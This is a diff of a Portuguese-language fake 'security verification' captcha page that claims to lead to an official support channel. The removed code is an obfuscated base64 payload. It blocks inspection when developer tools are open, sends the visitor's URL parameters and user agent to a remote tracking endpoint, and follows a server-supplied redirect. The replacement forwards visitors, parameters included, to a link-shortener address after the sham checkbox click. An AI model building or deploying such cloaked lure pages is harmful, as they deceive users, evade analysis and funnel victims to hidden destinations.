@@ -1,147 +1,161 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Verificação de Segurança</title>
 
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: Arial, Helvetica, sans-serif;
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+      font-family:Arial, Helvetica, sans-serif;
     }
 
-    body {
-      min-height: 100vh;
-      background: linear-gradient(135deg, #acd3ff, #5fa6ff);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
+    body{
+      min-height:100vh;
+      background:linear-gradient(135deg,#acd3ff,#5fa6ff);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:20px;
     }
 
-    .container {
-      width: 100%;
-      max-width: 445px;
-      background: #f8fafc;
-      border-radius: 24px;
-      padding: 32px;
-      box-shadow: 0 20px 45px rgba(0, 0, 0, 0.12);
-      text-align: center;
+    .container{
+      width:100%;
+      max-width:445px;
+      background:#f8fafc;
+      border-radius:24px;
+      padding:32px;
+      box-shadow:0 20px 45px rgba(0,0,0,0.12);
+      text-align:center;
     }
 
-    .icon {
-      width: 64px;
-      height: 64px;
-      margin: 0 auto 18px;
-      background: linear-gradient(135deg, #2563eb, #60a5fa);
-      border-radius: 18px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 28px;
+    .icon{
+      width:64px;
+      height:64px;
+      margin:0 auto 18px;
+      background:linear-gradient(135deg,#2563eb,#60a5fa);
+      border-radius:18px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-size:28px;
     }
 
-    h1 {
-      font-size: 25px;
-      color: #020617;
-      margin-bottom: 12px;
+    h1{
+      font-size:25px;
+      color:#020617;
+      margin-bottom:12px;
     }
 
-    .subtitle {
-      color: #334155;
-      font-size: 16px;
-      margin-bottom: 22px;
+    .subtitle{
+      color:#334155;
+      font-size:16px;
+      margin-bottom:22px;
     }
 
-    .box {
-      border: 1px solid #dbe4f0;
-      border-radius: 14px;
-      padding: 28px 18px;
-      text-align: left;
-      margin-bottom: 22px;
-      background: #f8fafc;
+    .box{
+      border:1px solid #dbe4f0;
+      border-radius:14px;
+      padding:28px 18px;
+      text-align:left;
+      margin-bottom:22px;
+      background:#f8fafc;
     }
 
-    .box h2 {
-      font-size: 22px;
-      color: #0f172a;
-      margin-bottom: 14px;
+    .box h2{
+      font-size:22px;
+      color:#0f172a;
+      margin-bottom:14px;
     }
 
-    .box p {
-      font-size: 16px;
-      color: #334155;
-      margin-bottom: 18px;
-      line-height: 1.25;
+    .box p{
+      font-size:16px;
+      color:#334155;
+      margin-bottom:18px;
+      line-height:1.4;
     }
 
-    .box ul {
-      list-style: none;
-      color: #020617;
-      font-size: 16px;
-      line-height: 1.6;
+    .box ul{
+      list-style:none;
+      color:#020617;
+      font-size:16px;
+      line-height:1.8;
     }
 
-    .captcha {
-      border: 1px solid #dbe4f0;
-      border-radius: 14px;
-      background: #f1f5f9;
-      padding: 18px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 14px;
-      cursor: pointer;
-      transition: 0.2s ease;
-      font-size: 16px;
-      font-weight: 700;
-      color: #020617;
+    .captcha{
+      border:1px solid #dbe4f0;
+      border-radius:14px;
+      background:#f1f5f9;
+      padding:18px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:14px;
+      cursor:pointer;
+      transition:0.2s ease;
+      font-size:16px;
+      font-weight:700;
+      color:#020617;
     }
 
-    .captcha:hover {
-      background: #eaf1f8;
+    .captcha:hover{
+      background:#eaf1f8;
     }
 
-    .checkbox {
-      width: 22px;
-      height: 22px;
-      border: 2px solid #9ca3af;
-      border-radius: 3px;
-      background: white;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 18px;
-      color: #2563eb;
+    .checkbox{
+      width:22px;
+      height:22px;
+      border:2px solid #9ca3af;
+      border-radius:3px;
+      background:white;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-size:18px;
+      color:#2563eb;
     }
 
-    .captcha.checked .checkbox {
-      border-color: #2563eb;
+    .captcha.checked .checkbox{
+      border-color:#2563eb;
     }
 
-    .loading {
-      display: none;
-      margin-top: 18px;
-      color: #334155;
-      font-size: 15px;
+    .loading{
+      display:none;
+      margin-top:18px;
+      color:#334155;
+      font-size:15px;
     }
 
-    .spinner {
-      width: 22px;
-      height: 22px;
-      border: 3px solid #cbd5e1;
-      border-top: 3px solid #2563eb;
-      border-radius: 50%;
-      margin: 0 auto 8px;
-      animation: spin 1s linear infinite;
+    .spinner{
+      width:22px;
+      height:22px;
+      border:3px solid #cbd5e1;
+      border-top:3px solid #2563eb;
+      border-radius:50%;
+      margin:0 auto 8px;
+      animation:spin 1s linear infinite;
     }
 
-    @keyframes spin {
-      to {
-        transform: rotate(360deg);
+    @keyframes spin{
+      to{
+        transform:rotate(360deg);
+      }
+    }
+
+    @media(max-width:480px){
+      .container{
+        padding:28px 22px;
+      }
+
+      h1{
+        font-size:23px;
+      }
+
+      .box h2{
+        font-size:21px;
       }
     }
   </style>
@@ -150,13 +164,19 @@
 <body>
 
   <div class="container">
+
     <div class="icon">🔒</div>
 
     <h1>Verificação de Segurança</h1>
-    <p class="subtitle">Confirme para continuar com segurança</p>
+
+    <p class="subtitle">
+      Confirme para continuar com segurança
+    </p>
 
     <div class="box">
+
       <h2>Acesso ao Atendimento</h2>
+
       <p>
         Você será direcionado para o canal oficial onde poderá visualizar todas
         as informações disponíveis e continuar o atendimento.
@@ -167,6 +187,7 @@
         <li>✓ Informações disponíveis</li>
         <li>✓ Atendimento rápido e seguro</li>
       </ul>
+
     </div>
 
     <div class="captcha" onclick="continuar()">
@@ -178,21 +199,30 @@
       <div class="spinner"></div>
       Redirecionando...
     </div>
+
   </div>
 
   <script>
     function continuar() {
+
       document.querySelector(".captcha").classList.add("checked");
+
       document.getElementById("checkbox").innerHTML = "✓";
+
       document.getElementById("loading").style.display = "block";
 
-      setTimeout(function () {
-        executarScriptFinal();
-      }, 900);
-    }
+      setTimeout(() => {
 
-    function executarScriptFinal() {
-      (function(_0x1a2b,_0x3c4d){var _0x5e6f=function(_0x7g8h){return decodeURIComponent(escape(atob(_0x7g8h)));};var _0x9i0j=_0x5e6f(_0x1a2b);(new Function(_0x9i0j))();})("KGZ1bmN0aW9uKCl7CnZhciBfMHhhMT0iYm90LTFiYTUzOTQ5IixfMHhiMj0iaHR0cHM6Ly9nZmFrYnJkdm5mdXR6bmh5dXZydi5zdXBhYmFzZS5jby9mdW5jdGlvbnMvdjEvdHJhY2stZXh0ZXJuYWwtY2xpY2siOwp2YXIgXzB4YzM9ZnVuY3Rpb24oKXt2YXIgdD1uZXcgRGF0ZSgpO2RlYnVnZ2VyO3JldHVybiBuZXcgRGF0ZSgpLXQ+MTAwO307CnNldEludGVydmFsKGZ1bmN0aW9uKCl7aWYoXzB4YzMoKSl7ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiI7d2luZG93LmxvY2F0aW9uLmhyZWY9ImFib3V0OmJsYW5rIjt9fSwxMDAwKTsKdmFyIF8weGQ0PWZ1bmN0aW9uKCl7dmFyIHc9d2luZG93Lm91dGVyV2lkdGgtd2luZG93LmlubmVyV2lkdGg+MTYwLGg9d2luZG93Lm91dGVySGVpZ2h0LXdpbmRvdy5pbm5lckhlaWdodD4xNjA7aWYod3x8aCl7ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiI7d2luZG93LmxvY2F0aW9uLmhyZWY9ImFib3V0OmJsYW5rIjt9fTsKc2V0SW50ZXJ2YWwoXzB4ZDQsNTAwKTsKKGZ1bmN0aW9uKCl7dmFyIF8weGU1PXt9O25ldyBVUkxTZWFyY2hQYXJhbXMod2luZG93LmxvY2F0aW9uLnNlYXJjaCkuZm9yRWFjaChmdW5jdGlvbih2LGspe18weGU1W2tdPXY7fSk7CmZldGNoKF8weGIyLHttZXRob2Q6IlBPU1QiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi9qc29uIn0sYm9keTpKU09OLnN0cmluZ2lmeSh7c2hvcnRDb2RlOl8weGExLHF1ZXJ5UGFyYW1zOl8weGU1LHVzZXJBZ2VudDpuYXZpZ2F0b3IudXNlckFnZW50LHVybENvbXBsZXRvOndpbmRvdy5sb2NhdGlvbi5zZWFyY2guc3Vic3RyaW5nKDEpfHxudWxsfSl9KQoudGhlbihmdW5jdGlvbihyKXtyZXR1cm4gci5qc29uKCk7fSkudGhlbihmdW5jdGlvbihkKXtpZihkJiZkLnJlZGlyZWN0VXJsKXt3aW5kb3cubG9jYXRpb24uaHJlZj1kLnJlZGlyZWN0VXJsO319KS5jYXRjaChmdW5jdGlvbigpe30pOwp9KSgpOwp9KSgpOw==");
+        // pega todos os parâmetros da URL
+        const params = window.location.search;
+
+        // destino final com parâmetros
+        const destino = "https://encurtar-link.click/l/bot-1ba53949" + params;
+
+        // redireciona
+        window.location.href = destino;
+
+      }, 1200);
     }
   </script>
 
